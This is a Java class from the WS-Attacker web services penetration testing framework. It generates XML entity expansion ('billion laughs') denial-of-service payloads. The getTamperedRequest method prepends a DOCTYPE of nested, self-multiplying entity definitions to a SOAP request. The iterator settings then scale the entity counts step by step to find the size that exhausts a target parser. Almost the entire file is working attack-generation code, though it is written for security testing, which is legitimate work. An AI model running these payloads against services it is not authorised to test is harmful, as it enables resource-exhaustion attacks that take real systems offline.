/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Christian Altmeier
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.intelligentdos.dos;

import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.apache.commons.lang3.RandomStringUtils;

import wsattacker.library.intelligentdos.common.DoSParam;
import wsattacker.library.intelligentdos.helper.IterateModel;
import wsattacker.library.intelligentdos.helper.IterateModel.IncreaseIncrementStrategie;
import wsattacker.library.intelligentdos.helper.IterateModel.IterateStrategie;

/**
 * @author Christian Altmeier
 */
public class XmlEntityExpansion
    extends AbstractDoSAttack
{

    private static final int MIN_NUMBER_OF_ENTITY_ELEMENTS = 2;

    private static final int MIN_NUMBER_OF_ENTITIES = 2;

    private static final String XML = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>";

    private final PayloadPosition[] possiblePossitions = { PayloadPosition.ELEMENT };

    private static final IterateModel defaultNumberOfEntities =
        IterateModel.custom().startAt( 2 ).stopAt( 200 ).setIncrement( 4 ).setIterateStrategie( IterateStrategie.MUL ).setIncreaseIncrementStrategie( IncreaseIncrementStrategie.NO ).build();

    private static final IterateModel defaultNumberOfEntityElements =
        IterateModel.custom().startAt( 2 ).stopAt( 4 ).setIncrement( 2 ).setIterateStrategie( IterateStrategie.MUL ).setIncreaseIncrementStrategie( IncreaseIncrementStrategie.NO ).build();

    // iterate
    private IterateModel numberOfEntities;

    private IterateModel numberOfEntityElements;

    // current
    private int currentNumberOfEntities;

    private int currentNumberOfEntityElements;

    private static final int currentStringLength = 2;

    public XmlEntityExpansion()
    {
        try
        {
            numberOfEntities = defaultNumberOfEntities.clone();
            numberOfEntityElements = defaultNumberOfEntityElements.clone();
        }
        catch ( CloneNotSupportedException e )
        {
            LOG.warn( e );
        }
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getName()
     */
    @Override
    public String getName()
    {
        return "XmlEntityExpansion";
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getPossiblePossitions()
     */
    @Override
    public PayloadPosition[] getPossiblePossitions()
    {
        PayloadPosition[] copy = new PayloadPosition[possiblePossitions.length];
        System.arraycopy( possiblePossitions, 0, copy, 0, possiblePossitions.length );
        return copy;
    }

    public IterateModel getNumberOfEntitiesIterator()
    {
        try
        {
            return numberOfEntities.clone();
        }
        catch ( CloneNotSupportedException ex )
        {
            Logger.getLogger( XmlElementCount.class.getName() ).log( Level.SEVERE, null, ex );
        }
        return null;
    }

    public void setNumberOfEntitiesIterator( IterateModel iterateModel )
    {
        if ( iterateModel == null )
        {
            throw new IllegalArgumentException( "NumberOfEntitiesIterator may not be null" );
        }

        numberOfEntities = iterateModel;
    }

    public IterateModel getNumberOfEntityElementsIterator()
    {
        try
        {
            return numberOfEntityElements.clone();
        }
        catch ( CloneNotSupportedException ex )
        {
            Logger.getLogger( XmlElementCount.class.getName() ).log( Level.SEVERE, null, ex );
        }
        return null;
    }

    public void setNumberOfEntityElementsIterator( IterateModel iterateModel )
    {
        if ( iterateModel == null )
        {
            throw new IllegalArgumentException( "NumberOfEntityElementsIterator may not be null" );
        }

        numberOfEntityElements = iterateModel;
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#hasFurtherParams()
     */
    @Override
    public boolean hasFurtherParams()
    {
        return numberOfEntities.hasNext() || numberOfEntityElements.hasNext();
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#nextParam()
     */
    @Override
    public void nextParam()
    {
        if ( !initialized )
        {
            currentNumberOfEntityElements = numberOfEntityElements.next();
            currentNumberOfEntities = numberOfEntities.next();

            initialized = true;
        }
        else if ( numberOfEntityElements.hasNext() )
        {
            currentNumberOfEntityElements = numberOfEntityElements.next();
        }
        else if ( numberOfEntities.hasNext() )
        {
            numberOfEntityElements.reset();
            currentNumberOfEntityElements = numberOfEntityElements.next();

            currentNumberOfEntities = numberOfEntities.next();
        }
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getCurrentParam()
     */
    @Override
    public List<DoSParam<?>> getCurrentParams()
    {
        List<DoSParam<?>> list = new ArrayList<DoSParam<?>>();
        list.add( new DoSParam<Integer>( "Number of Entities", currentNumberOfEntities ) );
        list.add( new DoSParam<Integer>( "Number of Entity Elements", currentNumberOfEntityElements ) );

        return list;
    }

    /*
     * (non-Javadoc)
     * @see
     * wsattacker.library.intelligentdos.dos.AbstractDoSAttack#getCommentLength(wsattacker.library.intelligentdos.dos
     * .DoSAttack.PayloadPosition)
     */
    @Override
    int getCommentLength( PayloadPosition payloadPosition )
    {
        int length = XML.length();
        length += 22; // <!DOCTYPE Envelope []>
        length += 15; // <!ENTITY x0 "">
        length += currentStringLength;

        for ( int element = 1; element < currentNumberOfEntities; element++ )
        {
            length += 14; // <!ENTITY x "">
            length += String.valueOf( element ).length();

            length += 2 * 3; // "&x;"
            length += 2 * String.valueOf( element - 1 ).length();
            for ( int aaa = 2; aaa < currentNumberOfEntityElements; aaa++ )
            {
                length += 3; // "&x;"
                length += String.valueOf( element - 1 ).length();
            }
        }
        length += 10; // "<s>&x;</s>"
        length += String.valueOf( currentNumberOfEntities - 1 ).length();

        return length;
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getTamperedRequest(java .lang.String,
     * wsattacker.library.intelligentdos.dos.DoSAttack.PayloadPosition)
     */
    @Override
    public String getTamperedRequest( String xml, PayloadPosition payloadPosition )
    {
        verifyPayloadPosition( payloadPosition );

        String random = RandomStringUtils.randomAlphabetic( currentStringLength );

        // prepend DTD to message
        StringBuilder sb = new StringBuilder();
        sb.append( XML );
        sb.append( "<!DOCTYPE Envelope [" );
        sb.append( "<!ENTITY x0 \"" + random + "\">" );

        for ( int entityElement = 1; entityElement < currentNumberOfEntities; entityElement++ )
        {
            sb.append( "<!ENTITY x" ).append( entityElement ).append( " \"" );
            sb.append( "&x" ).append( entityElement - 1 ).append( ";" );
            sb.append( "&x" ).append( entityElement - 1 ).append( ";" );
            for ( int entityCount = 2; entityCount < currentNumberOfEntityElements; entityCount++ )
            {
                sb.append( "&x" ).append( entityElement - 1 ).append( ";" );
            }
            sb.append( "\">" );
        }
        sb.append( "]" );
        sb.append( ">" );

        StringBuilder sbElement = new StringBuilder();
        sbElement.append( "<s>&x" ).append( currentNumberOfEntities - 1 ).append( ";</s>" );

        final String replacePlaceholder = payloadPosition.replacePlaceholder( xml, sbElement.toString() );
        sb.append( replacePlaceholder );

        return sb.toString();
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#minimal()
     */
    @Override
    public DoSAttack minimal()
    {
        XmlEntityExpansion xmlEntityExpansion = new XmlEntityExpansion();
        xmlEntityExpansion.currentNumberOfEntities = MIN_NUMBER_OF_ENTITIES;
        xmlEntityExpansion.currentNumberOfEntityElements = MIN_NUMBER_OF_ENTITY_ELEMENTS;

        return xmlEntityExpansion;
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#middle(wsattacker.library.intelligentdos.dos.DoSAttack)
     */
    @Override
    public DoSAttack middle( DoSAttack aThat )
    {
        if ( this == aThat )
        {
            XmlEntityExpansion xmlEntityExpansion = new XmlEntityExpansion();
            xmlEntityExpansion.currentNumberOfEntities = this.currentNumberOfEntities;
            xmlEntityExpansion.currentNumberOfEntityElements = this.currentNumberOfEntityElements;
            return xmlEntityExpansion;
        }

        if ( !aThat.getClass().equals( getClass() ) || !( aThat instanceof XmlEntityExpansion ) )
        {
            throw new IllegalArgumentException( aThat.getClass() + " is not allowed!" );
        }

        XmlEntityExpansion that = (XmlEntityExpansion) aThat;

        XmlEntityExpansion xmlEntityExpansion = new XmlEntityExpansion();
        if ( this.currentNumberOfEntities == that.currentNumberOfEntities
            && this.currentNumberOfEntityElements < that.currentNumberOfEntityElements )
        {
            xmlEntityExpansion.currentNumberOfEntities = this.currentNumberOfEntities;
            xmlEntityExpansion.currentNumberOfEntityElements = this.currentNumberOfEntityElements;
        }
        else if ( this.currentNumberOfEntities == that.currentNumberOfEntities )
        {
            xmlEntityExpansion.currentNumberOfEntities = this.currentNumberOfEntities;
            xmlEntityExpansion.currentNumberOfEntityElements =
                calculateMiddle( this.currentNumberOfEntityElements, that.currentNumberOfEntityElements );
        }
        else if ( this.currentNumberOfEntityElements < that.currentNumberOfEntityElements )
        {
            xmlEntityExpansion.currentNumberOfEntities =
                calculateMiddle( this.currentNumberOfEntities, that.currentNumberOfEntities );
            xmlEntityExpansion.currentNumberOfEntityElements = this.currentNumberOfEntityElements;
        }
        else
        {
            xmlEntityExpansion.currentNumberOfEntities =
                calculateMiddle( this.currentNumberOfEntities, that.currentNumberOfEntities );
            xmlEntityExpansion.currentNumberOfEntityElements =
                calculateMiddle( this.currentNumberOfEntityElements, that.currentNumberOfEntityElements );
        }

        return xmlEntityExpansion;
    }

    @Override
    public void initialize()
    {
        super.initialize();

        numberOfEntities.reset();
        numberOfEntityElements.reset();
    }

    /*
     * (non-Javadoc)
     * @see java.lang.Comparable#compareTo(java.lang.Object)
     */
    @Override
    public int compareTo( DoSAttack aThat )
    {
        // this optimization is usually worthwhile, and can
        // always be added
        if ( this == aThat )
            return EQUAL;

        if ( !aThat.getClass().equals( getClass() ) )
        {
            return EQUAL;
        }

        XmlEntityExpansion that = (XmlEntityExpansion) aThat;

        if ( this.currentNumberOfEntities < that.currentNumberOfEntities )
            return BEFORE;
        if ( this.currentNumberOfEntities > that.currentNumberOfEntities )
            return AFTER;

        if ( this.currentNumberOfEntityElements < that.currentNumberOfEntityElements )
            return BEFORE;
        if ( this.currentNumberOfEntityElements > that.currentNumberOfEntityElements )
            return AFTER;

        return EQUAL;
    }

}
